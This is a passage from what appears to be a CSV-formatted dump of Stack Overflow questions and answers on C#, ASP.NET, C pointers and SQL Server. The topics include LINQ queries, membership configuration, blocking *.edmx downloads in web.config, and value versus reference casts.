<p>EDIT: Yes, it's possible to compute the hash step by step. The <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.hashalgorithm.transformblock%28VS.71%29.aspx"" rel=""nofollow""><code>TransformBlock</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.hashalgorithm.transformfinalblock%28VS.71%29.aspx"" rel=""nofollow""><code>TransformFinalBlock</code></a> methods do this.</p>
"
"<p>I have a DataTable object. Every column is of type string.</p>

<p>Using LINQ, how can I get the maximum string length for every column?</p>
","33708","","<p>The maximum string length for the whole table (assuming at least one non-null value there, otherwise, <code>Max</code> will throw an exception):</p>

<pre><code>int maxStringLength = dataTable.AsEnumerable()
                              .SelectMany(row =&gt; row.ItemArray.OfType&lt;string&gt;())
                              .Max(str =&gt; str.Length);
</code></pre>

<p>If you want maximum string length for <strong>each</strong> column, you could do (assuming at least one non-null value in each column, otherwise, <code>Max</code> will throw an exception):</p>

<pre><code>List&lt;int&gt; maximumLengthForColumns = 
   Enumerable.Range(0, dataTable.Columns.Count)
             .Select(col =&gt; dataTable.AsEnumerable()
                                     .Select(row =&gt; row[col]).OfType&lt;string&gt;()
                                     .Max(val =&gt; val.Length)).ToList();
</code></pre>
"
"<ol>
<li><p>Is there any relationship between anonymous session ( where random identifier is generated for anonymous user, which enables the use of temporary profiles for unknown users) and a Session state?</p></li>
<li><p>If anonymous user is authenticated we need to clear anonymous identifier so that <em>MigrateAnonymous</em> event won't fire again. But why isnât Asp.Net able to detect that now user is authenticated (since it now has authentication cookie ) and thus doesnât send anonymous cookie back to browser?</p></li>
</ol>

<p>thanx</p>
","33708","","<ol>
<li><p>No. Anonymous identification uses its own cookie. It's unrelated to session state.</p></li>
<li><p>For example an anonymous user might have done some customizations to the application. You might want to store the customization info for him/her as soon as he registers on the Web site. If it destroys the cookie at the time of authentication, you'd lose access to the actions he/she had done.</p></li>
</ol>

<p>UPDATE (in response to the comment): </p>

<p>While from a purely technical perspective, it's perfectly possible to remove the cookie automatically, I think they had done this to <strong>make this step explicit</strong>. For example, if for any reason, you want to defer the migration to the next request, you can do that. The other point I can think is that <code>AnonymousIdentificationModule</code> is a completely different entity from <code>ProfileModule</code>. None of them require the other one to do the job. You could have several different custom per user customization modules that would work with anonymous identification. <code>ProfileModule</code> is just one of them (and note that <code>MigrateAnonymous</code> is controlled by <code>ProfileModule</code> and not <code>AnonymousIdentificationModule</code>). So, design-wise, <code>ProfileModule</code> <strong>shouldn't touch the anonymous identification cookie</strong>. <code>AnonymousIdentificationModule</code> could possibly intercept the request at some time and delete the cookie itself if it wanted to but that would <strong>reduce flexibility</strong> and you would have lost data if you haven't migrated it.</p>
"
"<p>I would like my two applications to be able to send strings to each other and depending on the string ""<em>do something</em>"".</p>

<p>This is for a <em>pre-proof-of-concept-mockup</em> type of thing so no security precautions needed and as inefficient as you want.</p>

<p>So how do I do this with a minimum of work on my part.</p>

<p>(You my dear fellow so user can work as hard as you please on the problem)</p>
","33708","","<p>One way is to use .NET Remoting <a href=""http://msdn.microsoft.com/en-us/library/system.runtime.remoting.channels.ipc.ipcchannel.aspx"" rel=""nofollow"">IpcChannel</a> class to communicate across different processes on the same machine.</p>
"
"<p>I'm making a domino game and when the user adds a domino to the left, the domino is added but when the function exits the domino added is GONE.</p>

<p>FYI:</p>

<ul>
<li>fitxesJoc (Link List) contains the dominoes of
the game and is a pointer passed to the function (so that it lasts all the game)</li>
<li><p>opcionesCorrectas (Domino) contains the correct choices of domino</p>

<ul>
<li>inferior (int) contains the smaller number of the domino</li>
<li>superior (int) contains the bigger number of the domino</li>
<li>pos (int) the position of the domino</li>
</ul></li>
<li><p>opcionFitxa (int) contains the choice of the player</p></li>
<li>ultimaFitxa->seg is the 'next' node</li>
</ul>

<pre>
tNode* ultimaFitxa = (tNode *)malloc(sizeof(tNode));
ultimaFitxa->info.inferior = opcionesCorrectas[opcionFitxa - 1].inferior;
ultimaFitxa->info.superior = opcionesCorrectas[opcionFitxa - 1].superior;
ultimaFitxa->info.pos = opcionesCorrectas[opcionFitxa - 1].pos;
ultimaFitxa->seg = fitxesJoc;
fitxesJoc = ultimaFitxa;</pre>

<p>Header of the function</p>

<pre><code>unsigned int demanar_fitxa_tirar(tJugador *jugador, tNode* fitxesJoc, tPartida *partida, tPila* fitxesBarrejades, bool primerCop)
</code></pre>

<p>Call of the function </p>

<pre><code>resultado = demanar_fitxa_tirar(&amp;Jugadors[jugadorActual], fitxesJoc, partida, fitxesBarrejades, true);
</code></pre>

<p>This way I add the domino, in the top of the other dominoes.</p>

<p>Thanks in Advance.</p>
","33708","","<p>From your code, it's not clear where your function starts and ends and what it takes as parameters but I <em>guess</em> your problem is with the <code>fitxesJoc</code> variable which is probably passed as an argument to the function. C copies arguments when calling functions (call-by-value). You could pass the address to <code>fitxesJoc</code> variable using a pointer instead and rewrite it as something like this:</p>

<pre><code>// fitxesJoc would be a `tNode**` rather than `tNode*`.
tNode* ultimaFitxa = (tNode *)malloc(sizeof(tNode));
ultimaFitxa-&gt;info.inferior = opcionesCorrectas[opcionFitxa - 1].inferior;
ultimaFitxa-&gt;info.superior = opcionesCorrectas[opcionFitxa - 1].superior;
ultimaFitxa-&gt;info.pos = opcionesCorrectas[opcionFitxa - 1].pos;
ultimaFitxa-&gt;seg = *fitxesJoc;
*fitxesJoc = ultimaFitxa;
</code></pre>
"
"<p>I have in my web application an ADO.NET Entity-Framework *.edmx file.</p>

<p>When I browse in the browser (when the application is running) to an edmx file, it doesn't show the error page like when browsing to a *.cs or vb file, it opens the edmx and shows my model scheme to all the users!!!</p>

<p>How can I avoid that.</p>
","33708","","<p>You should map the extension to the ASP.NET's <code>System.Web.HttpForbiddenHandler</code> class in <code>web.config</code>. If you are using IIS6, before you could do that, you should have mapped the extension to ASP.NET ISAPI handler.</p>

<p>IIS7 Integrated Mode:</p>

<pre><code>&lt;system.webServer&gt;
    &lt;handlers&gt;
        &lt;add name=""MyForbiddenExtensionHandler"" 
             path=""*.edmx"" 
             verb=""*"" 
             type=""System.Web.HttpForbiddenHandler"" 
             preCondition=""integratedMode"" /&gt;
    &lt;/handlers&gt;
&lt;/system.webServer&gt;
</code></pre>

<p>IIS7 Classic Mode. Something like:</p>

<pre><code>&lt;system.web&gt;
  &lt;httpHandlers&gt;
     &lt;add path=""*.edmx"" 
         verb=""*"" 
         type=""System.Web.HttpForbiddenHandler, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" /&gt;
  &lt;/httpHandlers&gt;
&lt;/system.web&gt;
&lt;system.webServer&gt;
  &lt;handlers&gt;
     &lt;add name=""MyExtensionISAPI"" 
         path=""*.edmx"" 
         verb=""*"" 
         modules=""IsapiModule"" 
         scriptProcessor=""C:\Windows\Microsoft.NET\Framework64\v2.0.50727\aspnet_isapi.dll"" preCondition=""classicMode,runtimeVersionv2.0,bitness64"" /&gt;
  &lt;/handlers&gt;
&lt;/system.webServer&gt;
</code></pre>

<p>IIS6 (after mapping the handler to <code>aspnet_isapi.dll</code> in IIS6 configuration):</p>

<pre><code>&lt;system.web&gt;
  &lt;httpHandlers&gt;
     &lt;add path=""*.edmx"" 
         verb=""*"" 
         type=""System.Web.HttpForbiddenHandler, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" /&gt;
  &lt;/httpHandlers&gt;
&lt;/system.web&gt;
</code></pre>
"
"<p>How can I generate a random hexadecimal number with a length of my choice using C#?</p>
","33708","","<pre><code>static Random random = new Random();
public static string GetRandomHexNumber(int digits)
{
    byte[] buffer = new byte[digits / 2];
    random.NextBytes(buffer);
    string result = String.Concat(buffer.Select(x =&gt; x.ToString(""X2"")).ToArray());
    if (digits % 2 == 0)
        return result;
    return result + random.Next(16).ToString(""X"");
}
</code></pre>
"
"<p>I'm trying to access a Page within an HttpModule and I think I should do this by calling HttpContext.Current.Handler (This should reference the current page) but I'm getting null all the time.</p>

<p>I'm developing using .Net 3.5 framework.</p>

<p>I'm checking this on AuthorizeRequest and AuthenticateRequest</p>

<p>Thanks.</p>
","33708","","<p>Probably, the request has not been handed out to a handler yet (for example, you're in <code>BeginRequest</code>).</p>
"
"<p>In Delphi, if there was an exception during construction of an object: any allocated memory would be released and an exception would be thrown. For example, the following was <strong><em>guaranteed</em></strong> to either return a valid <strong><code>Camera</code></strong> object, or throw an exception:</p>

<pre><code>Camera c = new Camera();
</code></pre>

<p>You <strong>never</strong> had to check the resulting variable for null:</p>

<pre><code>Camera c = new Camera();
if (c == null)
   throw new Exception(""Error constructing Camera"") //waste of time
</code></pre>

<p>Is the same true in the CLR? </p>

<p>And are there other syntatical constucts where a return value is guaranteed to either be valid, or throw an exception? </p>

<ul>
<li>Creating structures (e.g. Rectangle)?</li>
<li>getting a member of an enumeration?</li>
<li>the result of Object.ToString()?</li>
<li>mathmatical operations?</li>
</ul>

<p>In the case of performing math:</p>

<pre><code>Int32 aspect = 1650.0 / 1080.0;
if (aspect == null) 
   throw new Exception(""Division of two numbers returned null"")
</code></pre>
","33708","","<p>Yes. I'd like to put it this way (as <em>fail</em> might mean <em>logical failure</em> too): If a constructor doesn't throw an exception, the return value is guaranteed to be non-<code>null</code> so you never have to perform such a check.</p>

<p>Creating structures (e.g. Rectangle): A <code>struct</code> can't be <code>null</code> at all (<code>Nullable</code> types are considered completely different types, i.e. <code>typeof(int?) != typeof(int)</code>). Calling a constructor for a structure would either fail by throwing an exception or return an instance.</p>

<p>Getting a member of an enumeration: An <code>enum</code> is a just a set of constants. There's nothing like ""getting a member at runtime."" It's substituted at compile time.</p>

<p>The result of <code>Object.ToString()</code>: Like any method, it can return any valid value for <code>string</code> type which includes <code>null</code> and could also throw an exception (in which case, it doesn't return a value at all).</p>

<p>Mathematical operations: All expressions will return a value or throw an exception. The return value can be any valid value for that type (e.g. <code>Int32</code> can never be <code>null</code>).</p>
"
"<p>I'm writing a small C program to do some number crunching, and it needs to pass around arrays between functions. The functions should accept and return pointers, right?</p>

<p>For example, this (I know it may not be the most efficient thing):</p>

<pre><code>int* reverse(int* l, int len) {
    int* reversed = malloc(sizeof(*reversed)*len);
    int i, j;
    for (i = 0, j = len-1; i &lt; len; i++, j--) {
        reversed[j] = l[i];
    }
    return reversed;
}
</code></pre>

<p>Am I using pointers right?</p>
","33708","","<p>From a low level perspective, an array is a continuous chunk of memory that's accessed by the address of the beginning of that chunk and the offset, so from that abstraction level, it is a pointer. However, from C language perspective, an array type is different from a pointer type. Basically an array can be assigned to a pointer value but <strong>it's not the same type</strong>. </p>

<p>For the purpose of your function, you are doing OK.</p>
"
"<p>i downloaded asp.net mvc and i am playing around with the main tutorial.</p>

<p>In the upper right, when i click log in or register new user, i am trying to understand where this data is being stored.  I dont see any SQL database or any other data store.</p>

<p>i see something that says this below:</p>

<pre><code>                // Attempt to register the user
            MembershipCreateStatus createStatus = MembershipService.CreateUser(userName, password, email);
</code></pre>

<p>but again, i can't find the actual data store.</p>

<p>Am i missing something?</p>
","33708","","<p>It will copy <code>aspnetdb.mdf</code> file to <code>App_Data</code> directory when you use membership services for the first time.</p>

<p>You can manually create a SQL Server database by <a href=""http://msdn.microsoft.com/en-us/library/x28wfk74.aspx"" rel=""nofollow""><code>aspnet_regsql</code></a> and set the <code>ApplicationServices</code> connection string in <code>web.config</code>.</p>
"
"<p>Does it matter if you are using 'And' or 'AndAlso' in linq queries in vb.net?  I know in normal operations 'AndAlso' is short circuit and so will often be faster, but I don't know if that carries over into linq queries.  Does it matter if the linq query is against a database or against an in memory collection?</p>
","33708","","<p>For LINQ to object queries, it would definitely matter. For other LINQ providers, it depends on the provider itself. At the expression tree level, they <strong>are different</strong> but the provider might choose to translate/run it the same way. For instance, there's no equivalent notion in SQL so LINQ to SQL translates them to identical SQL.</p>
"
"<p>In C#,
Suppose I am in a form, and I pressed a button I made to close it.</p>

<pre><code>this.Close();
some_action(); //can I do this??
</code></pre>

<p>can I perform another action after I closed the form or does the thread die and everything after that is lost?</p>
","33708","","<p>Depends on what you are trying to do and the context of the statement. If the form being closed is the main form which owns the message loop, you can't do any <strong>UI related stuff</strong> (e.g. you can't display another <code>MessageBox</code>). If you are not doing it from another window (which doesn't own the message loop), you could do anything (even UI related) as long as you aren't manipulating the closed form object (you'll get <code>ObjectDisposedException</code> just like any disposed object). </p>

<p>By the way, the thread doesn't die as a result of <code>Close</code>. Closing the main window causes the message loop to terminate and not the thread itself. For example, the following program</p>

<pre><code>static void Main() {
    Application.Run(new Form1());
    Application.Run(new Form2());
}
</code></pre>

<p>will display <code>Form2</code> after <code>Form1</code> is closed (using a newly created message loop). This proves that the thread is not dead.</p>
"
"<p><br></p>

<p>Say I create <em>CreateUserWizard</em> control and use  <em>AspNetSqlMembershipProvider</em> (defined in <em>machine.config</em>) as a default membership provider. Assuming I change default provider's <em>requiresQuestionAndAnswer</em> attribute to <em>false</em>, then <em>CreateUserWizard</em> control template should not be required to provide <em>Question</em> and <em>Answer</em> fields. But if I request the page via <em>IIS7</em> I get the following exception: </p>

<blockquote>
  <p>CreateUserWizard1: CreateUserWizardStep.ContentTemplate does not contain an IEditableTextControl with ID Question for the security question, this is required if your membership provider requires a question and answer.</p>
</blockquote>

<p>A) The above exception suggests that when requesting a page via <em>IIS7</em>, runtime doesnât use <em>AspNetSqlMembershipProvider</em> (defined in <em>machine.config</em>)as a default provider?! If true, then why is that?</p>

<p>B) And where can I find the definition for <em>IIS7âs</em> default provider?</p>

<p><br></p>

<p>thanx</p>

<p><br></p>

<p>EDIT:</p>

<p>Here is <code>&lt;Membership&gt;</code> element in machine.config file:</p>

<pre><code>    &lt;membership&gt;
     &lt;providers&gt;
		&lt;add name=""AspNetSqlMembershipProvider"" 
         type=""System.Web.Security.SqlMembershipProvider, System.Web,Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" 
         connectionStringName=""LocalSqlServer"" 
         enablePassswordRetrieval=""false"" 
         requiresQuestionAndAnswer=""false"" 
         applicationName=""/"" requiresUniqueEmail=""false"" 
         passwordFormat=""Hashed"" maxInvalidPasswordAttempts=""5"" 
         minRequiredPasswordLength=""7"" 
         minRequiredNonalphanumericCharacters=""0"" 
         passwordAttemptWindow=""10"" 
         passwordStrengthRegularExpression=""""/&gt;
    &lt;/providers&gt;
   &lt;/membership&gt;
</code></pre>

<p><br /></p>

<blockquote>
  <p>Are you changing the <code>machine.config</code> for the correct version of runtime? </p>
</blockquote>

<p>I'm not sure what you mean by that. I'm running Asp.Net 3.5, which I think uses Asp.Net engine version 2.0.50727. Thus I manipulated machine.config located inside  <em>C:\Windows\Microsoft.NET\Framework\v2.0.50727\CONFIG</em></p>
","33708","","<p>IIS7 uses its own configuration file located at <code>%windir%\System32\inetsrv\config\applicationHost.config</code>. However, this file deals with IIS7 specific configuration (e.g. <code>&lt;system.webServer&gt;</code>) and not <code>&lt;system.web&gt;</code> stuff. I believe those are still read from <code>machine.config</code> and <code>web.config</code> files. Indeed, the default value (specified in <code>machine.config</code>) for <code>requiresQuestionAndAnswer</code> for the <code>AspNetSqlMembershipProvider</code> is <code>true</code> on my machine.</p>

<p><strong>UPDATE:</strong></p>

<p>Under a 64 bit OS, a .NET application can either run on a 32 bit CLR in WOW64 mode or natively run under x64 mode. Each .NET framework instance has its own set of config files and ignores all other configuration files. </p>

<p>IIS7 on a 64 bit OS runs applications in 64 bit mode by default. You can, however, set an application pool to run as a 32 bit WOW64 process (<code>enable32BitAppOnWin64</code>, which you can set in Advanced Settings dialog for an application pool in IIS7 manager). If you do that, obviously it'll use settings from 32 bit <code>machine.config</code>. The reason VS Web server uses 32 bit <code>machine.config</code> is exactly this: it runs as a WOW64 process.</p>
"
"<p>is there a way in .NET (or some sort of standard extension methods) to ask questions of an enumeration?</p>

<p>For example is the current item the first or last item in the enumeration:</p>

<pre><code>string s = """";

foreach (var person in PeopleListEnumerator) {

  if (PeopleListEnumerator.IsFirstItem) s += ""["";

  s += person.ToString();

  if (!PeopleListEnumerator.IsLastItem) s += "","";
  else s += ""]"";
}
</code></pre>
","33708","","<p>Just for the sake of fun, a solution to the general problem that doesn't require eager evaluation and has a single local variable (except the enumerator):</p>

<pre><code>static class TaggedEnumerableExtensions
{
    public class TaggedItem&lt;T&gt;
    {
        public TaggedItem(T value, bool isFirst, bool isLast)
        {
            IsFirst = isFirst;
            IsLast = isLast;
            Value = value;
        }
        public T Value { get; private set; }
        public bool IsFirst { get; private set; }
        public bool IsLast { get; private set; }
    }
    public static IEnumerable&lt;TaggedItem&lt;T&gt;&gt; ToTaggedEnumerable&lt;T&gt;(this IEnumerable&lt;T&gt; e)
    {
        using (var enumerator = e.GetEnumerator()) {
            if (!enumerator.MoveNext())
                yield break;
            var current = enumerator.Current;
            if (!enumerator.MoveNext()) {
                yield return new TaggedItem&lt;T&gt;(current, true, true);
                yield break;
            } else {
                yield return new TaggedItem&lt;T&gt;(current, true, false);
            }

            for (;;) {
                current = enumerator.Current;
                if (!enumerator.MoveNext()) {
                    yield return new TaggedItem&lt;T&gt;(current, false, true);
                    yield break;
                }
                yield return new TaggedItem&lt;T&gt;(current, false, false);
            }
        }
    }
}
</code></pre>

<p>Test:</p>

<pre><code>class Program
{
    static void Main(string[] args)
    {
        foreach (var item in Enumerable.Range(0, 10).ToTaggedEnumerable()) {
            Console.WriteLine(""{0} {1} {2}"", item.IsFirst, item.IsLast, item.Value);
        }
    }
}
</code></pre>
"
"<p>In dotNet a line throws an exception and is caught, how can I figure out which line in which file threw the exception? Seems relatively straightforward, but I can't figure it out...</p>
","33708","","<p>You can only do it if you have debug symbols available.</p>

<pre><code>catch(Exception ex) {
    // check the ex.StackTrace property
}
</code></pre>

<p>If you want to debug such a situation in VS, you'd better just check <code>Thrown</code> checkbox for <code>Common Language Runtime Exceptions</code> in <code>Exceptions</code> dialog located in <code>Debug</code> menu. The debugger will break as soon as the exception is thrown, even if it's in a <code>try</code> block.</p>
"
"<p>I have some C code that is something of a puzzle. For a reason to do with this code, I'm wondering how I can tell if a <code>struct</code> object <strong>is ending up on the heap or stack?</strong> </p>

<p>The objects are <strong>not</strong> being created with <code>malloc</code> or <code>calloc</code>. They start their life in the form of an array. For the purposes of this post, I'm going to call the struct Emp. </p>

<pre><code>Emp myEmp[6];

/* Each myEmp[?] item is populated in code */
</code></pre>

<p>The objects are sorted and manipulated in various ways and at some point, the objects are copied and then handed to a array-pointer. The copy is done via <code>memcpy</code>. The objects are then put in to something like: <code>Emp* emps_a[6]</code>.</p>

<p>The objects go from a copy and are assigned in to the above emps_a.</p>

<pre><code>int i;
for( i = 0; i &lt; n; i++ )
{
    emps_a[i] = myEmpsCopy + i;
}
</code></pre>

<p>I'm not sure if some or any of this has bearing on my question. I never need free() or do memory clean up... I'm afraid I don't know too much about C. </p>

<p>The help is greatly appreciated.</p>
","33708","","<p>Leaving global variables and variables declared with <code>static</code> modifier (which are allocated in a separate memory region) aside, local variables declared in a function body are allocated on the stack whereas whatever you call <code>malloc</code> for is allocated on the heap. Also, C99 variable sized arrays and memory allocated with <code>_alloca</code> will end up on stack.</p>

<pre><code>int* x[10];   // The addresses are held on the stack
int i;        // On the stack
for(i = 0; i &lt; 10; ++i)
   x[i] = malloc(sizeof(int)*10);  // Allocates memory on the heap
</code></pre>

<p>For example, in the above code, there's an array of <code>int*</code> values on the stack holding addresses to 10 different locations in the heap.</p>
"
"<p>I need to render a list of Person objects, say, in a comma delimited format using a Partial View in ASP.NET MVC. My problem is that when rendered using the following code:</p>

<pre><code>&lt;% foreach (var person in Model) { %&gt;
    &lt;%= Html.ActionLink&lt;PersonController&gt;(c =&gt; c.Edit(person.PersonID), Html.Encode(person.Name)) %&gt;,&amp;nbsp;
&lt;% } %&gt;
</code></pre>

<p>I get a trailing comma after the last item. What's the most elegant/least stupid way to have this list of persons rendered without the last comma?</p>

<p>My two options so far, in no order, would be:</p>

<ol>
<li>Use JavaScript to remove the trailing comma on the client side</li>
<li>Manually create the list using code, instead of markup, in the partial view</li>
</ol>

<p>Neither of these options appeal to me - any ideas?</p>

<p>Thanks!</p>
","33708","","<pre><code>&lt;% bool first = true;
   foreach (var person in Model) { 
     if (first) first = false; else Response.Write("",""); %&gt;
     &lt;%= Html.ActionLink&lt;PersonController&gt;(c =&gt; c.Edit(person.PersonID), Html.Encode(person.Name)) %&gt;
&lt;% } %&gt;
</code></pre>
"
"<p>I am working in a mailing application in C# and, basically, I need to be able to determine which recipients successfully received the message, which ones did not, no matter what was the failure reason.</p>

<p>In summary, I need an exception to be thrown whenever the email address does not exist, for example. However, SmtpClient.Send does not throw an exception in this case, so I'd need to monitor the delivery failure replies and parse them, maybe.</p>

<p>I know this is not a simple task, so I'd ask you experts some tips on how to handle the main issues with email sending.</p>

<p>Thanks in advance!!</p>
","33708","","<p>There's no way you could detect that reliably. It's the nature of SMTP protocol. It's completely up to the recipient SMTP server to choose to tell you if the email is delivered or not.</p>
"
"<p>I want to store arrays of bytes in SQL Server.  What datatype, or pre INSERT manipulation would you suggest to store these?</p>

<p>I wouldn't expect these byte[] to exceed 1024 in length.</p>
","33708","","<p><code>varbinary(1024)</code> is what you're looking for.</p>

<p>There are three types in SQL Server for binary value storage:</p>

<p><code>binary(n)</code> for fixed-length binary data of length <code>n</code>. Length can be <code>1</code> to <code>8000</code>.<br />
<code>varbinary(n)</code> for variable-length binary data maximum length <code>n</code>. Maximum length can be <code>1</code> to <code>8000</code>.<br />
Above types will be stored in the row data itself.
<code>varbinary(max)</code> which is used to store large binary values (BLOBs) up to 2GB. The actual value is stored in a separate location if it's larger than 8000 bytes and just a pointer is stored in the row itself. This type is available since SQL Server 2005.</p>

<p><code>image</code> data type was used to store BLOBs prior to SQL Server 2005. It's deprecated in favor of <code>varbinary(max)</code>. The storage location for <code>image</code> is always outside data row.</p>
"
"<pre><code>char myData[505][3][50];   //2D array, each 50 chars long   
char **tableData[505] = {NULL};  

const char* text;
text = sqlite3_column_text(stmt, col_index);

strcpy(myData[row_index][c_index],text); 

tableData[row_index] = myData[row_index][c_index]; &lt;--?
</code></pre>

<p>I would like to assign the pointer to pointer array tableData to the content of the static array myData but do not know the syntax, or if it possible. Any advice?</p>
","33708","","<p>What <code>tableData</code> is going to represent? </p>

<p>If it's going to represent an array of strings (I'll call a <code>char*</code> a string for simplicity in this answer), you should edit the declaration to <code>char* tableData[len];</code>. </p>

<p>If it's going to represent a 2D array of strings (which is what the current declaration means), you should set it as <code>tableData[i] = myData[x]</code>. </p>

<p><code>myData[x][y]</code> is a single string, not an array of strings. In the last line of your snippet, you are trying to assign it to something that expects an array of strings. This is not a valid operation.</p>
"
"<p>Was creating a simple console application to do some prototyping and was shocked to see that the right-click/context menu is missing from a standard .NET console app!</p>

<p>I'm unable to find any information about this, and intellisense isn't helping.</p>

<p>So what happened to it?  Can I get it back?  And if not, how can I configure my console application to treat ctrl-c/ctrl-v as standard?</p>
","33708","","<p>Context menu doesn't show up when you right click on the console app body (not the title bar) when VS debugger is attached. </p>
"
"<p>It's hard enough to find reliable numbers as to general adoption of the .NET framework. This questions concerns an even more specific case: what's the situation among home users?</p>

<p>I am wondering wether .NET is a good choice for a desktop application when targetting home users?</p>

<p>Assuming the application in question is a small-medium sized app (download, install &amp; run), and the size of the framework is considerably larger, having the user download and install the framework just for the sake of that application seems like a big thumbs-down.</p>

<p>I know that Vista ships with .NET 3.0 out of the box (2003 ships with 1.1, but it's a server version), but that's just not enough considering that XP still has over 60% market share, including non-Windows systems (Accroding to <a href=""http://marketshare.hitslink.com/operating-system-market-share.aspx?qprid=10"">hitslink.com</a>, as of May this year).</p>

<p>Here's another thing: I almost can't think of any home-user targetted software that uses .NET (There's Catalyst, what else?). Why is that? Is this a clue that the framework isn't really that popular among home users?</p>
","33708","","<p>Media Center is built with .NET Framework and Windows XP MCE has it out of the box.</p>
"
"<p>I'd like to create an internal auto-property:</p>

<pre><code>internal bool IP { get; protected internal set; }
</code></pre>

<p>I thought it would be possible to make the setter <code>protected</code> or <code>protected internal</code> - but I always get the error <strong>accessibility modifier must be more restrictive than the property</strong>. Isn't that the case? <code>Private</code> does not help me, here.</p>

<p><strong>EDIT:</strong><br />
The question is: How do I implement an auto-property with a internal getter and a protected setter?</p>
","33708","","<p>It's effectively <code>protected</code> or <code>internal</code>, not <strong>and</strong>. It's accessible <strong>both</strong> by derived classes and types in the same assembly. It's a common misconception to think <code>protected internal</code> means accessible only to derived classes in the same assembly.</p>
"
"<p>How do you get the <a href=""http://msdn.microsoft.com/en-us/library/system.drawing.systemcolors%5Fmembers.aspx"" rel=""nofollow"">ActiveCaptionText</a> color when a window is maximized?</p>

<p>The color is correct when the window is restored:</p>

<p><img src=""http://i39.tinypic.com/2s627nl.jpg"" alt=""alt text"" /></p>

<p>But is the wrong color when the window is maximized:</p>

<p><img src=""http://i40.tinypic.com/2zz3ql4.jpg"" alt=""alt text"" /></p>

<p>How do you get the <strong>active</strong> <a href=""http://msdn.microsoft.com/en-us/library/system.drawing.systemcolors%5Fmembers.aspx"" rel=""nofollow"">ActionCaptionText</a>?</p>

<p><strong>Note:</strong> Same question for <a href=""http://msdn.microsoft.com/en-us/library/system.drawing.systemcolors.activecaption.aspx"" rel=""nofollow"">ActiveCaption</a>, <a href=""http://msdn.microsoft.com/en-us/library/system.drawing.systemcolors.inactivecaption.aspx"" rel=""nofollow"">InactiveCaption</a> and <a href=""http://msdn.microsoft.com/en-us/library/system.drawing.systemcolors.inactivecaptiontext.aspx"" rel=""nofollow"">InactiveCaptionText</a>.</p>

<p><hr /></p>

<p>It seems like there should be something with:</p>

<pre><code>VisualStyleRenderer vs = 
   new VisualStyleRenderer(VisualStyleElement.Window.MaxCaption.Active);

label1.ForeColor = vs.GetColor(ColorProperty.TextColor);
</code></pre>

<p><a href=""http://stackoverflow.com/questions/1036934/active-caption-text-color-detect-change-in-net"">But i can't make it work.</a> it returns black for both <strong>Caption</strong> and <strong>MaxCaption</strong>:</p>

<p><img src=""http://i41.tinypic.com/3994h.jpg"" alt=""alt text"" /></p>

<p><hr /></p>

<h2>References</h2>

<ul>
<li>Stackoverflow: <a href=""http://stackoverflow.com/questions/1036934/active-caption-text-color-detect-change-in-net"">Active Caption Text Color â detect change (in .Net)</a></li>
<li>MSDN Forums: <a href=""http://social.msdn.microsoft.com/forums/en-US/winforms/thread/08f3e139-0a60-4193-ac1f-8fa80ec04029/"" rel=""nofollow"">How to get maximized text color?</a> </li>
</ul>
","33708","","<p>It's an issue with Aero theme. It ignores that color in the title bar. Try Windows classic theme.</p>
"
"<p>This seems to be a trivial question but I got hung on it for a few hours now (maybe too much Java killed my C++ braincells).</p>

<p>I have created a class that has the following constructor (i.e. no default constructor)</p>

<pre><code>VACaptureSource::VACaptureSource( std::string inputType, std::string inputLocation ) {
    if( type == """" || location == """" ) {
	throw std::invalid_argument(""Empty type or location in VACaptureSource()"");
}
type = inputType;
location = inputLocation;

// Open the given media source using the appropriate OpenCV function.
if( type.compare(""image"") ) {
	frame = cvLoadImage( location.c_str() );
	if( !frame ) {
		throw std::runtime_error(""error opening file"");
	}
}
else {
	throw std::invalid_argument(""Unknown input type in VACaptureSource()"");
}
</code></pre>

<p>}</p>

<p>When I want to create an instance, I use </p>

<pre><code>    // Create input data object
try {
	VACaptureSource input = VACaptureSource(""image"", ""/home/cuneyt/workspace/testmedia/face_images/jhumpa_1.jpg"");
}
catch( invalid_argument&amp; ia ) {
	cerr &lt;&lt; ""FD Error: "" &lt;&lt; ia.what() &lt;&lt; endl;
	usage(argv[0]);
}
catch( runtime_error&amp; re ) {
	cerr &lt;&lt; ""FD Error: "" &lt;&lt; re.what() &lt;&lt; endl;
	usage(argv[0]);
}
</code></pre>

<p>However, in this case the instance is local to this block and I can't refer to it anywhere else. On the other hand, I can't say</p>

<pre><code>VACAptureSource input;
</code></pre>

<p>at the beginning of the program since there's no default constructor. </p>

<p>What is the correct way to do this?</p>

<p>Thanks!</p>
","33708","","<p>A local variable is scoped to the block in which it's allocated (like Java) but it'll destruct as soon as the block ends (unlike Java) so you should either do all the stuff you want in the try block itself (which might not be desirable if you want to only handle constructor exceptions) or you should allocate the object somewhere else (e.g. heap) and use a pointer in the parent block to access it.</p>
"
"<p>I'm currently doing a project in C# working with windows forms.  During the course of it, I did the following</p>

<pre><code>        void HideButtons(object sender, EventArgs e)
    {
        Button hider = ((Button)sender);
        foreach(Button tohide in hider.Parent.Controls)
            tohide.Hide();
        hider.Show();
        hider.Text = ""UnHide"";
        hider.Click -= new EventHandler(HideButtons);
        hider.Click += new EventHandler(ShowButtons); 
    }
</code></pre>

<p>The purpose of this code is to have a button which hides all the other buttons in the container it's in except itself, and then turn into an Unhide button which does the same thing in reverse.</p>

<p>Now, that's all well and good, except, as I compile this, I realize to myself I've hit a problem.  hider is its unique object, being the return from ((Button)sender).  It's not necessarily the reference to sender, and this code will probably do nothing.</p>

<p>But low and behold, it works exactly like I wanted it to and initially thought it would.  Which got me to wondering, does a cast always return a reference to the original object?  If not, how do I guarantee that (button)sender = sender?</p>

<p>I know that's not the case for doubles/ints, as</p>

<pre><code>        public static int Main()
    {
        int a;
        double b;
        b = 10.5;
        a = (int)b;
        a++;
        return 0;
    }
</code></pre>

<p>ends up with a being 11, and b being 10.5   But that may be due to doubles/ints being structs.  This behavior worries me, and it'd be nice to know that it will always return a reference so I can put my worrysome mind to rest.</p>
","33708","","<p>For <strong>reference types</strong> casted through the inheritance hierarchy, it'll always reference the same instance. However, for value types, casts might involve boxing and unboxing which will copy stuff. Other than that, casts are not just in the inheritance hierarchy. You can declare your own cast operator which has the characteristics of a method. It can return whatever object it likes.</p>
"
